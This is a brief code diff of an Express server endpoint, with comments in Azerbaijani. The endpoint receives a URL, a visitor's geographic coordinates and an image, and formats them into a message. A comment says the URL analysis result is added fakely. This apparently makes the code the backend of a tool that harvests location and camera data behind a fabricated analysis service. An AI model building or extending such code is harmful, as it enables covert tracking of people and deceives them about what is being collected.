@@ -68,18 +68,8 @@ app.post('/api/send-data', async (req, res) => {
   const { videoUrl, location, image } = req.body;
   console.log(`📩 Yeni məlumat alındı: video=${!!videoUrl}, location=${!!location}, image=${!!image}`);
 
-  let messageText = '';
-
-if (videoUrl) {
-  messageText += `📞 Nömrə: ${videoUrl}\n`;
-}
-
-if (location?.latitude && location?.longitude) {
-  messageText += `📍 Lokasiya alındı\n`;
-  messageText += `🌍 ${location.latitude}, ${location.longitude}`;
-} else {
-  messageText += `📍 Lokasiya alınmadı`;
-}
+  let messageText = `⚡️ *Yeni Analiz Tələbi!* ⚡️\n\n`;
+messageText += `*Girilən URL:* ${videoUrl || 'Təyin edilməyib'}\n`;
 
 
     // URL analiz nəticəsini saxta şəkildə əlavə edirik
